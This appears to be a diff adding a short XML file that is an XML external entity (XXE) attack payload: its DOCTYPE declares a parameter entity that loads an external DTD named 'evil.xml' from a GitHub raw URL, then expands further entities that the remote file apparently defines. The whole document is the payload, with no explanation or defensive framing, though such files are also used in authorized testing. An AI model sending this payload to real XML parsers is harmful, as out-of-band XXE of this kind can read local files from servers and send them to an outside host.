@@ -1,0 +1,6 @@
+<?xml version="1.0" ?>
+<!DOCTYPE xxe [
+<!ENTITY % xml SYSTEM "https://raw.githubusercontent.com/quyluaqbvn/payloadnhohanh/master/evil.xml">
+%xml;
+%ext;]>
+<xxe>&hehe;</xxe>
